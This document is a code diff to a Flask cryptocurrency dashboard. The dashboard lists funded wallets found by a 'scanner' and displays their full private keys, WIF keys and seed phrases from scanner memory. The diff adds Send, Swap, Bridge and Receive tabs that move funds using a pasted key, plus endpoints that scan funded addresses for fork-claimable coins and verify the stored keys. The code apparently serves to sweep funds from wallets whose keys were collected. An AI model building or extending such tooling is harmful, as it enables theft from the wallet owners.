@@ -27,6 +27,7 @@ sys.path.insert(0, str(HOME))
 
 import requests, ecdsa
 import balance_db as db
+import multichain as mc
 
 # ── RLP encoder (pure Python, no deps) ──────────────────────────
 def _ib(n): return b"" if n==0 else n.to_bytes((n.bit_length()+7)//8,"big")
@@ -90,7 +91,7 @@ def _err_any(e):
     raise e
 
 
-# ── HTML template (single page, all inline) ─────────────────────────
+# ── HTML template (tabbed dashboard) ────────────────────────────────
 HTML = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -104,38 +105,41 @@ HTML = r"""<!DOCTYPE html>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#000;color:#fff;font:14px/1.5 'SF Mono','Fira Code',monospace;overflow-x:hidden}
 #app{max-width:100%;margin:0 auto;padding:8px}
-hdr{display:flex;align-items:center;gap:12px;padding:12px 8px;border-bottom:2px solid #ff8c00;margin-bottom:8px;flex-wrap:wrap}
+hdr{display:flex;align-items:center;gap:12px;padding:12px 8px;border-bottom:2px solid #ff8c00;margin-bottom:4px;flex-wrap:wrap}
 hdr .logo{font-size:22px;font-weight:bold;color:#ff8c00}
 hdr .stat{font-size:12px;color:#888}
 hdr .stat .val{color:#ffd700}
-hdr .live{color:#0f0}
-hdr .cached{color:#666}
-#stats{display:flex;gap:16px;flex-wrap:wrap;padding:8px;background:#111;border-radius:4px;margin-bottom:8px}
+.live{color:#0f0}.cached{color:#666}
+#tabs{display:flex;gap:4px;padding:4px 0 0;overflow-x:auto}
+#tabs button{padding:8px 16px;background:#111;color:#888;border:1px solid #333;border-bottom:none;border-radius:4px 4px 0 0;cursor:pointer;font:inherit;font-size:13px;white-space:nowrap}
+#tabs button.active{background:#1a1a1a;color:#ff8c00;border-color:#ff8c00;font-weight:bold}
+.tab-panel{display:none;border:1px solid #333;border-radius:0 4px 4px 4px;background:#0a0a0a;padding:12px;min-height:400px}
+.tab-panel.active{display:block}
+#stats{display:flex;gap:16px;flex-wrap:wrap;padding:4px 0;margin-bottom:4px}
 #stats .s{font-size:11px;color:#888}
 #stats .s .n{color:#ffd700;font-weight:bold}
-#searchbar{display:flex;gap:8px;padding:8px 0;flex-wrap:wrap}
-#searchbar input,#searchbar select,#searchbar button{padding:8px 12px;background:#1a1a1a;color:#fff;border:1px solid #333;border-radius:4px;font:inherit}
-#searchbar input{flex:1;min-width:200px}
-#searchbar button{background:#ff8c00;color:#000;font-weight:bold;border:none;cursor:pointer}
-#searchbar button:active{opacity:.8}
-#main{display:flex;gap:8px;height:calc(100vh - 200px)}
-#leaderboard{flex:1;overflow-y:auto;border:1px solid #333;border-radius:4px;background:#0a0a0a;min-width:280px}
-#detail{flex:1;overflow-y:auto;border:1px solid #333;border-radius:4px;background:#0a0a0a;min-width:280px;padding:12px}
+#searchbar{display:flex;gap:8px;padding:0 0 8px;flex-wrap:wrap}
+#searchbar input,#searchbar select,#searchbar button,.form-row input,.form-row select,.form-row button,.form-row textarea{padding:8px 12px;background:#1a1a1a;color:#fff;border:1px solid #333;border-radius:4px;font:inherit;font-size:13px}
+#searchbar input{flex:1;min-width:160px}
+#searchbar button,.btn-orange{background:#ff8c00;color:#000;font-weight:bold;border:none;cursor:pointer}
+#searchbar button:active,.btn-orange:active{opacity:.8}
+.btn-orange:disabled{opacity:.4}
+#main{display:flex;gap:8px;height:calc(100vh - 260px)}
+#leaderboard{flex:1;overflow-y:auto;border:1px solid #333;border-radius:4px;background:#0a0a0a;min-width:260px}
+#detail{flex:1;overflow-y:auto;border:1px solid #333;border-radius:4px;background:#0a0a0a;min-width:260px;padding:12px}
 .wallet{padding:8px 12px;border-bottom:1px solid #1a1a1a;cursor:pointer;display:flex;gap:8px;align-items:center;font-size:13px}
 .wallet:hover{background:#1a1a1a}
 .wallet.active{background:#2a1a00;border-left:3px solid #ff8c00}
-.wallet .r{color:#ff8c00;font-weight:bold;min-width:32px}
-.wallet .c{color:#0af;min-width:40px;font-size:11px}
-.wallet .bal{color:#0f0;text-align:right;min-width:100px}
-.wallet .addr{color:#999;font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:200px}
-#detail .section{margin-bottom:16px}
+.wallet .r{color:#ff8c00;font-weight:bold;min-width:28px}
+.wallet .c{color:#0af;min-width:36px;font-size:11px}
+.wallet .bal{color:#0f0;text-align:right;min-width:90px}
+.wallet .addr{color:#999;font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:180px}
+#detail .section{margin-bottom:12px}
 #detail .label{color:#ff8c00;font-weight:bold;display:block;margin-bottom:4px}
 #detail .val{word-break:break-all;font-size:13px;line-height:1.6;color:#ffd700}
 #detail .addr-row{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #1a1a1a;font-size:12px}
 #detail .addr-row .chain{color:#0af;min-width:50px}
-#detail .addr-row .bal{color:#0f0;min-width:100px;text-align:right}
 #detail .addr-row .addr{color:#999;flex:1;margin:0 8px;word-break:break-all}
-#detail .addr-row .usd{color:#ffd700;min-width:80px;text-align:right}
 #detail .btns{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
 #detail .btns button{padding:6px 12px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:4px;cursor:pointer;font:inherit;font-size:12px}
 #detail .btns button:hover{background:#2a1a00}
@@ -144,6 +148,16 @@ hdr .cached{color:#666}
 .nav button:disabled{opacity:.4}
 .nav .pg{color:#888;font-size:13px;align-self:center}
 #toast{position:fixed;bottom:20px;right:20px;background:#ff8c00;color:#000;padding:12px 20px;border-radius:4px;font-weight:bold;display:none;z-index:99}
+.form-row{display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;align-items:center}
+.form-row label{color:#888;font-size:12px;min-width:50px}
+.form-row input,.form-row select{flex:1;min-width:120px}
+.result-box{margin-top:12px;padding:12px;background:#111;border:1px solid #333;border-radius:4px;max-height:300px;overflow-y:auto;font-size:12px;word-break:break-all;color:#ffd700}
+.result-box .err{color:#f44}
+.result-box .ok{color:#0f0}
+.addr-card{display:flex;justify-content:space-between;align-items:center;padding:6px 8px;border-bottom:1px solid #1a1a1a;font-size:12px}
+.addr-card .chain{color:#0af;min-width:60px;font-weight:bold}
+.addr-card .ad{color:#ffd700;flex:1;margin:0 8px;word-break:break-all;font-size:11px}
+.addr-card button{font-size:10px;padding:2px 8px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:3px;cursor:pointer}
 @media(max-width:768px){#main{flex-direction:column;height:auto}#leaderboard,#detail{max-height:50vh}}
 </style>
 </head>
@@ -158,12 +172,22 @@ hdr .cached{color:#666}
 <span style="flex:1"></span>
 <div class="stat" id="clock">--</div>
 </hdr>
+<div id="tabs">
+<button class="active" onclick="switchTab('balances')">💰 Balances</button>
+<button onclick="switchTab('send')">📤 Send</button>
+<button onclick="switchTab('swap')">🔄 Swap</button>
+<button onclick="switchTab('bridge')">🌉 Bridge</button>
+<button onclick="switchTab('receive')">📥 Receive</button>
+</div>
+
+<!-- Balances Tab -->
+<div id="tab-balances" class="tab-panel active">
 <div id="stats"></div>
 <div id="searchbar">
-<input type="text" id="q" placeholder="Search address fragment, chain, balance..." oninput="doSearch()">
+<input type="text" id="q" placeholder="Search address, chain, balance..." oninput="doSearch()">
 <select id="chainFilter" onchange="doFilter()">
 <option value="">All chains</option>
-<option>ETH</option><option>MATIC</option><option>BTC</option><option>SOL</option><option>BNB</option><option>AVAX</option><option>BASE</option><option>ARB</option><option>OP</option><option>LTC</option><option>DOGE</option><option>XRP</option><option>MONAD</option>
+<option>ETH</option><option>MATIC</option><option>BTC</option><option>SOL</option><option>BNB</option><option>AVAX</option><option>BASE</option><option>ARB</option><option>OP</option><option>LTC</option><option>DOGE</option>
 </select>
 <select id="sortBy" onchange="doFilter()">
 <option value="balance">Sort: Balance</option>
@@ -183,8 +207,72 @@ hdr .cached{color:#666}
 <button onclick="nextPage()" id="btnNext">Next ▶</button>
 </div>
 </div>
+
+<!-- Send Tab -->
+<div id="tab-send" class="tab-panel">
+<div class="form-row"><label>Chain</label><select id="sendChain">
+<option>ETH</option><option>MATIC</option><option>BNB</option><option>AVAX</option><option>BASE</option><option>ARB</option><option>OP</option>
+</select></div>
+<div class="form-row"><label>Private Key</label><input type="password" id="sendKey" placeholder="64-char hex private key"></div>
+<div class="form-row"><label>To Address</label><input id="sendTo" placeholder="0x... or BTC/SOL address"></div>
+<div class="form-row"><label>Amount</label><input id="sendAmt" placeholder="0.01" type="number" step="any"></div>
+<div class="form-row">
+<button class="btn-orange" onclick="doSend()" style="flex:1">📤 Send</button>
+<button onclick="doSendLiveBalance()" style="background:#1a1a1a;color:#0af;border:1px solid #0af">💰 Check Balance</button>
+</div>
+<div id="sendResult" class="result-box" style="display:none"></div>
+</div>
+
+<!-- Swap Tab -->
+<div id="tab-swap" class="tab-panel">
+<div class="form-row"><label>Chain</label><select id="swapChain" onchange="updateSwapTokens()">
+<option value="eth">ETH</option><option value="matic">MATIC</option><option value="bnb">BNB</option><option value="base">BASE</option><option value="arb">ARB</option><option value="sol">SOL</option>
+</select></div>
+<div class="form-row"><label>From</label><select id="swapFrom"></select><input id="swapAmt" placeholder="0.01" type="number" step="any" style="max-width:120px"></div>
+<div class="form-row"><label>To</label><select id="swapTo"></select></div>
+<div class="form-row"><label>Address</label><input id="swapAddr" placeholder="Your wallet address"></div>
+<div class="form-row"><button class="btn-orange" onclick="doSwapQuote()" style="flex:1">🔄 Get Quote</button></div>
+<div id="swapResult" class="result-box" style="display:none"></div>
+</div>
+
+<!-- Bridge Tab -->
+<div id="tab-bridge" class="tab-panel">
+<div class="form-row"><label>From</label><select id="bridgeFrom">
+<option value="eth">ETH</option><option value="matic">MATIC</option><option value="bnb">BNB</option><option value="avax">AVAX</option><option value="base">BASE</option><option value="arb">ARB</option><option value="op">OP</option>
+</select></div>
+<div class="form-row"><label>To</label><select id="bridgeTo">
+<option value="base">BASE</option><option value="arb">ARB</option><option value="op">OP</option><option value="matic">MATIC</option><option value="bnb">BNB</option><option value="eth">ETH</option>
+</select></div>
+<div class="form-row"><label>Token</label><input id="bridgeToken" value="ETH" placeholder="ETH/USDC"></div>
+<div class="form-row"><label>Amount</label><input id="bridgeAmt" placeholder="0.01" type="number" step="any"></div>
+<div class="form-row"><label>Address</label><input id="bridgeAddr" placeholder="Your wallet address"></div>
+<div class="form-row"><button class="btn-orange" onclick="doBridgeQuote()" style="flex:1">🌉 Get Bridge Quote</button></div>
+<div id="bridgeResult" class="result-box" style="display:none"></div>
+</div>
+
+<!-- Receive Tab -->
+<div id="tab-receive" class="tab-panel">
+<div class="form-row"><label>Private Key</label><input type="password" id="recvKey" placeholder="64-char hex private key" style="flex:1"></div>
+<div class="form-row"><button class="btn-orange" onclick="doReceive()" style="flex:1">📥 Derive All Addresses</button></div>
+<div id="recvResult" class="result-box" style="display:none"></div>
+</div>
+
+</div>
 <div id="toast"></div>
 <script>
+// ── Tab switching ──
+function switchTab(name){
+ document.querySelectorAll('#tabs button').forEach(b=>b.classList.remove('active'));
+ document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+ document.getElementById('tab-'+name).classList.add('active');
+ event.target.classList.add('active');
+}
+
+// ── Shared ──
+function toast(m){let t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(()=>t.style.display='none',2000)}
+function copyAddr(a){navigator.clipboard.writeText(a);toast('Copied!')}
+
+// ── Balances tab (existing logic) ──
 let PAGE=0,PERPAGE=50,TOTAL=0,focus=null,wallets=[],autoTimer=null;
 async function load(){
  try{
@@ -205,85 +293,146 @@ async function load(){
   document.getElementById('pgInfo').textContent=`Page ${PAGE+1} · ${TOTAL} total`;
   document.getElementById('btnPrev').disabled=PAGE<=0;
   document.getElementById('btnNext').disabled=(PAGE+1)*PERPAGE>=TOTAL;
- }catch(e){console.error(e);document.getElementById('stLive').textContent='○ ERR';document.getElementById('leaderboard').innerHTML='<div style="color:#f66;padding:12px">API error — retrying…</div>';}
+ }catch(e){console.error(e);document.getElementById('stLive').textContent='○ ERR';document.getElementById('leaderboard').innerHTML='<div style="color:#f66;padding:12px">API error</div>';}
 }
 function renderLb(){
  let lb=document.getElementById('leaderboard'),h='';
  wallets.forEach((w,i)=>{
-  let bal=w.balance;let bs=bal>1e6?(bal/1e6).toFixed(1)+'M':bal>1?(bal).toFixed(2):bal>1e-8?bal.toFixed(8):'0';
-  let addr=(w.address||'');let as=addr.length>20?addr.slice(0,10)+'...'+addr.slice(-8):addr;
+  let bal=w.balance,bs=bal>1e6?(bal/1e6).toFixed(1)+'M':bal>1?(bal).toFixed(2):bal>1e-8?bal.toFixed(8):'0';
+  let addr=(w.address||''),as=addr.length>20?addr.slice(0,10)+'...'+addr.slice(-8):addr;
   h+=`<div class="wallet${focus===i?' active':''}" onclick="showDetail(${i})" title="${addr}">
-   <span class="r">#${PAGE*PERPAGE+i+1}</span>
-   <span class="c">${(w.chain||'?').toUpperCase()}</span>
-   <span class="bal">${bs}</span>
-   <span class="addr">${as}</span>
-  </div>`;
+   <span class="r">#${PAGE*PERPAGE+i+1}</span><span class="c">${(w.chain||'?').toUpperCase()}</span>
+   <span class="bal">${bs}</span><span class="addr">${as}</span></div>`;
  });
  lb.innerHTML=h||'<div style="color:#666;padding:12px">No funded wallets found</div>';
 }
 async function showDetail(i){
- focus=i;renderLb();
- let w=wallets[i],d=document.getElementById('detail');
+ focus=i;renderLb();let w=wallets[i],d=document.getElementById('detail');
  let bal=w.balance,bs=bal>1e6?(bal/1e6).toFixed(6)+'M':bal>1?bal.toFixed(6):bal.toFixed(12);
- let html=`<div class="section"><span class="label">RANK</span><span class="val">#${PAGE*PERPAGE+i+1} / ${TOTAL}</span></div>
- <div class="section"><span class="label">CHAIN</span><span class="val">${(w.chain||'?').toUpperCase()}</span></div>
- <div class="section"><span class="label">ADDRESS (FULL — no truncation)</span><span class="val" style="font-size:11px">${w.address||''}</span></div>
+ d.innerHTML=`<div class="section"><span class="label">CHAIN</span><span class="val">${(w.chain||'?').toUpperCase()}</span></div>
+ <div class="section"><span class="label">ADDRESS</span><span class="val" style="font-size:11px">${w.address||''}</span></div>
  <div class="section"><span class="label">BALANCE</span><span class="val">${bs}</span></div>
- <div class="section"><span class="label">CHECKED</span><span class="val">${w.checked_at||'unknown'}</span></div>
- <div class="section"><span class="label">STATUS</span><span class="val">${w.live?'● LIVE':'○ CACHED'} ${w.settled?'SETTLED':''}</span></div>
- <div class="btns"><button onclick="copyAddr('${w.address}')">📋 Copy Address</button><button onclick="openExplorer('${w.chain}','${w.address}')">🔗 Explorer</button></div>
- <div id="keySection" style="margin-top:16px"><span style="color:#888">🔑 Loading key material from scanner memory...</span></div>`;
- d.innerHTML=html;
- // Fetch full key material asynchronously
+ <div class="btns"><button onclick="copyAddr('${w.address}')">📋 Copy</button>
+ <button onclick="openExplorer('${w.chain}','${w.address}')">🔗 Explorer</button>
+ <button onclick="fillSend('${w.chain}','${w.address}')">📤 Send</button></div>
+ <div id="keySection" style="margin-top:12px"><span style="color:#888">🔑 Loading keys...</span></div>`;
  let addr=encodeURIComponent(w.address||'');
- try{
-  let r=await fetch('/api/wallet/'+addr),kd=await r.json();
-  let ks=document.getElementById('keySection');
-  if(!kd.found){ks.innerHTML='<div class="section"><span class="label">🔑 KEY MATERIAL</span><span class="val" style="color:#888">'+kd.reason+'</span></div>';return}
-  let kh='<div class="section"><span class="label">🔑 KEY MATERIAL (FULL — NEVER TRUNCATED)</span></div>';
-  if(kd.hex_keys&&kd.hex_keys.length){
-   kh+='<div class="section"><span class="label">HEX PRIVATE KEYS ('+kd.hex_keys.length+')</span>';
-   kd.hex_keys.forEach((k,j)=>{kh+='<div class="val" style="font-size:10px;word-break:break-all;margin:4px 0">['+(j+1)+'] '+k+' <button onclick="copyAddr(\''+k+'\')" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">📋</button></div>'});
-   kh+='</div>';
-  }
-  if(kd.wifs&&kd.wifs.length){
-   kh+='<div class="section"><span class="label">WIF KEYS ('+kd.wifs.length+')</span>';
-   kd.wifs.forEach((k,j)=>{kh+='<div class="val" style="font-size:10px;word-break:break-all;margin:4px 0">['+(j+1)+'] '+k+' <button onclick="copyAddr(\''+k+'\')" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">📋</button></div>'});
-   kh+='</div>';
-  }
-  if(kd.seeds&&kd.seeds.length){
-   kh+='<div class="section"><span class="label">🌱 BIP39 SEED PHRASES ('+kd.seeds.length+')</span>';
-   kd.seeds.forEach((k,j)=>{
-    let id='seed_'+j+'_'+Date.now();
-    window['_seed_'+id]=k;
-    kh+='<div class="val" style="font-size:11px;word-break:break-all;margin:4px 0;background:#0a0a0a;padding:8px;border:1px solid #333;border-radius:4px">['+(j+1)+'] '+k+' <button data-copy-id="seed_'+id+'" class="copyBtn" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">📋</button></div>';
-   });
-   kh+='</div>';
-  }
-  if(kd.chain_addresses){
-   kh+='<div class="section"><span class="label">CHAIN ADDRESSES FROM MEMORY</span>';
-   for(let[c,addrs]of Object.entries(kd.chain_addresses)){
-    addrs.forEach(a=>{kh+='<div class="addr-row"><span class="chain">'+c.toUpperCase()+'</span><span class="addr">'+a+'</span><span class="usd"><button onclick="copyAddr(\''+a+'\')" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">📋</button></span></div>'});
-   }
-   kh+='</div>';
-  }
-  if(kd.source){kh+='<div class="section"><span class="label">SOURCE</span><span class="val" style="font-size:11px">'+kd.source+'</span></div>'}
-  if(kd.timestamp){kh+='<div class="section"><span class="label">FOUND</span><span class="val">'+kd.timestamp+'</span></div>'}
+ try{let r=await fetch('/api/wallet/'+addr),kd=await r.json(),ks=document.getElementById('keySection');
+  if(!kd.found){ks.innerHTML='<div class="section"><span class="label">🔑 KEY</span><span class="val" style="color:#888">'+kd.reason+'</span></div>';return}
+  let kh='<div class="section"><span class="label">🔑 KEY MATERIAL</span></div>';
+  if(kd.hex_keys&&kd.hex_keys.length){kh+='<div class="section"><span class="label">HEX KEYS</span>';
+   kd.hex_keys.forEach((k,j)=>{kh+=`<div class="val" style="font-size:10px;margin:2px 0">[${j+1}] ${k} <button onclick="copyAddr('${k}')" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">📋</button></div>`});kh+='</div>';}
+  if(kd.seeds&&kd.seeds.length){kh+='<div class="section"><span class="label">🌱 SEED PHRASES</span>';
+   kd.seeds.forEach((k,j)=>{kh+=`<div class="val" style="font-size:11px;margin:2px 0;background:#0a0a0a;padding:8px;border:1px solid #333;border-radius:4px">[${j+1}] ${k} <button onclick="copyAddr('${k.replace(/'/g,"\\'")}')" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">📋</button></div>`});kh+='</div>';}
   ks.innerHTML=kh;
- }catch(e){document.getElementById('keySection').innerHTML='<span style="color:#f44">Key lookup failed: '+e.message+'</span>'}
+ }catch(e){document.getElementById('keySection').innerHTML='<span style="color:#f44">'+e.message+'</span>'}
 }
-function copyAddr(a){navigator.clipboard.writeText(a);toast('Copied!')}
-document.addEventListener('click',function(e){let b=e.target.closest('.copyBtn');if(b){let id=b.getAttribute('data-copy-id');if(id&&window['_seed_'+id]){navigator.clipboard.writeText(window['_seed_'+id]);toast('Copied!')}}})
+function fillSend(chain,addr){switchTab('send');document.getElementById('sendChain').value=chain.toUpperCase();document.getElementById('sendTo').value=addr}
 function openExplorer(c,a){
- let urls={ETH:`https://etherscan.io/address/${a}`,MATIC:`https://polygonscan.com/address/${a}`,BTC:`https://mempool.space/address/${a}`,SOL:`https://solscan.io/account/${a}`,BNB:`https://bscscan.com/address/${a}`,AVAX:`https://snowtrace.io/address/${a}`,BASE:`https://basescan.org/address/${a}`,ARB:`https://arbiscan.io/address/${a}`,OP:`https://optimistic.etherscan.io/address/${a}`,LTC:`https://litecoinspace.org/address/${a}`};
+ let urls={ETH:`https://etherscan.io/address/${a}`,MATIC:`https://polygonscan.com/address/${a}`,BTC:`https://mempool.space/address/${a}`,SOL:`https://solscan.io/account/${a}`,BNB:`https://bscscan.com/address/${a}`,AVAX:`https://snowtrace.io/address/${a}`,BASE:`https://basescan.org/address/${a}`,ARB:`https://arbiscan.io/address/${a}`,OP:`https://optimistic.etherscan.io/address/${a}`,LTC:`https://litecoinspace.org/address/${a}`,DOGE:`https://dogechain.info/address/${a}`};
  window.open(urls[c.toUpperCase()]||urls.ETH,'_blank');
 }
-function toast(m){let t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(()=>t.style.display='none',2000)}
 function prevPage(){if(PAGE>0){PAGE--;load()}}
 function nextPage(){PAGE++;load()}
 function doSearch(){PAGE=0;load()}
 function doFilter(){PAGE=0;load()}
-document.addEventListener('keydown',e=>{if(e.key==='ArrowRight')nextPage();if(e.key==='ArrowLeft')prevPage();if(e.key==='r')location.reload()});
+document.addEventListener('keydown',e=>{if(e.key==='ArrowRight')nextPage();if(e.key==='ArrowLeft')prevPage()});
+
+// ── Send tab ──
+async function doSend(){
+ let r=document.getElementById('sendResult');r.style.display='block';r.innerHTML='<span style="color:#ff8c00">⏳ Sending...</span>';
+ let chain=document.getElementById('sendChain').value.toLowerCase();
+ let key=document.getElementById('sendKey').value.trim();
+ let to=document.getElementById('sendTo').value.trim();
+ let amt=parseFloat(document.getElementById('sendAmt').value);
+ if(!key||!to||!amt){r.innerHTML='<span class="err">Fill all fields</span>';return}
+ try{
+  let resp=await fetch('/api/send-multi',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chain:chain,private_key:key,to:to,amount:amt})});
+  let d=await resp.json();
+  if(d.ok){r.innerHTML=`<span class="ok">✓ TX SENT!</span><br>Hash: ${d.tx_hash}<br>From: ${d.from}<br>To: ${d.to}<br>Chain: ${d.chain}<br><a href="${d.explorer}" target="_blank" style="color:#0af">🔗 View on Explorer</a>`}
+  else{r.innerHTML=`<span class="err">✗ ${d.error}</span><br><pre style="color:#888;font-size:11px">${JSON.stringify(d,null,2)}</pre>`}
+ }catch(e){r.innerHTML=`<span class="err">✗ ${e.message}</span>`}
+}
+async function doSendLiveBalance(){
+ let r=document.getElementById('sendResult');r.style.display='block';r.innerHTML='<span style="color:#ff8c00">⏳ Checking...</span>';
+ let chain=document.getElementById('sendChain').value.toLowerCase();
+ let key=document.getElementById('sendKey').value.trim();
+ if(!key){r.innerHTML='<span class="err">Enter private key first</span>';return}
+ try{
+  let resp=await fetch('/api/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({private_key:key})});
+  let d=await resp.json();
+  if(d.error){r.innerHTML=`<span class="err">${d.error}</span>`;return}
+  let addr=d[chain]?d[chain].address:null;
+  if(!addr){r.innerHTML='<span class="err">Cannot derive address for '+chain+'</span>';return}
+  let br=await fetch(`/api/balance-live?chain=${chain}&address=${addr}`),bd=await br.json();
+  if(bd.balance!=null){r.innerHTML=`<span class="ok">💰 ${bd.balance} ${bd.symbol} on ${chain.toUpperCase()}</span><br><span style="color:#888;font-size:11px">${addr}</span>`}
+  else{r.innerHTML=`<span class="err">Balance check failed: ${bd.error||'unknown'}</span>`}
+ }catch(e){r.innerHTML=`<span class="err">${e.message}</span>`}
+}
+
+// ── Swap tab ──
+function updateSwapTokens(){
+ let c=document.getElementById('swapChain').value;
+ let opts={eth:['ETH','USDC','USDT','DAI','WBTC'],matic:['MATIC','USDC','USDT'],bnb:['BNB','USDC','USDT'],base:['ETH','USDC'],arb:['ETH','USDC','USDT'],sol:['SOL','USDC','USDT']};
+ let tokens=opts[c]||['ETH','USDC'];
+ let sf=document.getElementById('swapFrom'),st=document.getElementById('swapTo');
+ sf.innerHTML=tokens.map(t=>`<option>${t}</option>`).join('');
+ st.innerHTML=tokens.map(t=>`<option>${t}</option>`).join('');
+ st.selectedIndex=1;
+}
+async function doSwapQuote(){
+ let r=document.getElementById('swapResult');r.style.display='block';r.innerHTML='<span style="color:#ff8c00">⏳ Getting swap quote...</span>';
+ let chain=document.getElementById('swapChain').value;
+ let fromT=document.getElementById('swapFrom').value;
+ let toT=document.getElementById('swapTo').value;
+ let amt=parseFloat(document.getElementById('swapAmt').value);
+ let addr=document.getElementById('swapAddr').value.trim();
+ if(!amt||!addr){r.innerHTML='<span class="err">Fill amount and address</span>';return}
+ try{
+  let u=`/api/swap/quote?chain=${chain}&from_token=${fromT}&to_token=${toT}&amount=${amt}&from_addr=${addr}`;
+  let resp=await fetch(u),d=await resp.json();
+  if(d.ok){let q=d.quote;r.innerHTML=`<span class="ok">✓ Quote ready</span><br><br>From: ${amt} ${fromT}<br>To: ~${q.buyAmount?parseInt(q.buyAmount)/1e6:q.outAmount?parseInt(q.outAmount)/1e9:'?'} ${toT}<br>Price: ${q.price||'?'}<br><pre style="color:#888;font-size:10px;max-height:150px;overflow-y:auto">${JSON.stringify(q,null,2)}</pre>`}
+  else{r.innerHTML=`<span class="err">✗ ${d.error}</span>`}
+ }catch(e){r.innerHTML=`<span class="err">✗ ${e.message}</span>`}
+}
+
+// ── Bridge tab ──
+async function doBridgeQuote(){
+ let r=document.getElementById('bridgeResult');r.style.display='block';r.innerHTML='<span style="color:#ff8c00">⏳ Getting bridge quote...</span>';
+ let fc=document.getElementById('bridgeFrom').value;
+ let tc=document.getElementById('bridgeTo').value;
+ let tok=document.getElementById('bridgeToken').value;
+ let amt=parseFloat(document.getElementById('bridgeAmt').value);
+ let addr=document.getElementById('bridgeAddr').value.trim();
+ if(!amt||!addr){r.innerHTML='<span class="err">Fill amount and address</span>';return}
+ try{
+  let u=`/api/bridge/quote?from_chain=${fc}&to_chain=${tc}&from_token=${tok}&to_token=${tok}&amount=${amt}&from_addr=${addr}`;
+  let resp=await fetch(u),d=await resp.json();
+  if(d.ok&&d.quote){let q=d.quote;r.innerHTML=`<span class="ok">✓ Bridge quote ready</span><br><br>${q.action?.fromToken?.symbol||tok}: ${amt}<br>→ ${q.action?.toToken?.symbol||tok}: ~${q.estimate?.toAmount||'?'}<br>Bridge: ${q.tool||'LI.FI'}<br><pre style="color:#888;font-size:10px;max-height:150px;overflow-y:auto">${JSON.stringify(q,null,2)}</pre>`}
+  else{r.innerHTML=`<span class="err">✗ ${d.error||'No routes found'}</span>`}
+ }catch(e){r.innerHTML=`<span class="err">✗ ${e.message}</span>`}
+}
+
+// ── Receive tab ──
+async function doReceive(){
+ let r=document.getElementById('recvResult');r.style.display='block';r.innerHTML='<span style="color:#ff8c00">⏳ Deriving addresses...</span>';
+ let key=document.getElementById('recvKey').value.trim();
+ if(!key){r.innerHTML='<span class="err">Enter private key</span>';return}
+ try{
+  let resp=await fetch('/api/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({private_key:key})});
+  let d=await resp.json();
+  if(d.error){r.innerHTML=`<span class="err">${d.error}</span>`;return}
+  let h='<span class="ok">✓ Addresses derived</span><br><br>';
+  for(let[chain,info]of Object.entries(d)){
+   if(info.error){h+=`<div class="addr-card"><span class="chain">${chain.toUpperCase()}</span><span style="color:#f44">${info.error}</span></div>`}
+   else{h+=`<div class="addr-card"><span class="chain">${chain.toUpperCase()}</span><span class="ad">${info.address}</span><button onclick="copyAddr('${info.address}')">📋</button><button onclick="window.open('${info.explorer}','_blank')" style="margin-left:4px">🔗</button></div>`}
+  }
+  r.innerHTML=h;
+ }catch(e){r.innerHTML=`<span class="err">✗ ${e.message}</span>`}
+}
+
+// ── Init ──
+updateSwapTokens();
 autoTimer=setInterval(load,8000);
 load();
 </script>
@@ -427,13 +576,45 @@ def api_health():
 
 @app.route("/api/legacy")
 def api_legacy():
-    """Return fork-claimable assets (ETHW, ETC) for all funded ETH addresses."""
+    """Return fork-claimable assets (ETHW, ETC, BCH, BSV + 25+ more) for all funded addresses."""
     try:
-        import legacy_asset_detector as ldr
-        data = ldr.detect_all()
+        import abandoned_coin_scanner as acs
+        data = acs.scan_all_funded(max_per_chain=500)
         return jsonify(data)
     except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        # Fallback to legacy detector
+        try:
+            import legacy_asset_detector as ldr
+            data = ldr.detect_all()
+            return jsonify(data)
+        except Exception as e2:
+            return jsonify({"error": str(e)}), 500
+
+
+@app.route("/api/legacy/address")
+def api_legacy_address():
+    """Check fork assets for a specific address."""
+    address = request.args.get("address", "").strip()
+    chain = request.args.get("chain", "eth").strip().lower()
+    if not address:
+        return _api_error("Missing address", 400)
+    try:
+        import abandoned_coin_scanner as acs
+        findings = acs.scan_address(chain, address)
+        return jsonify({"address": address, "chain": chain, "findings": findings})
+    except Exception as e:
+        return _api_error(str(e), 500)
+
+
+@app.route("/api/verify-keys")
+def api_verify_keys():
+    """Run key verification on scanner memory — returns valid/invalid counts."""
+    try:
+        import key_verifier as kv
+        report = kv.validate_scanner_memory()
+        return jsonify(report)
+    except Exception as e:
+        return _api_error(str(e), 500)
 
 
 # ── Full key material lookup from scanner memory ──────────────────
@@ -453,15 +634,22 @@ def _norm_addr(ad: str) -> str:
 def _keyed_address_set() -> set:
     """Addresses that belong to a stored private key / WIF / seed.
 
-    Sources (union):
+    Sources (union, comprehensive):
       1. wallets_forever.addr_index
       2. wallets_forever raw_json addresses[] (backfill if index thin)
       3. balance_cache.derivations
+      4. LIVE crypto_scanner derive from every hex_key/wif/seed in scanner memory (high-confidence)
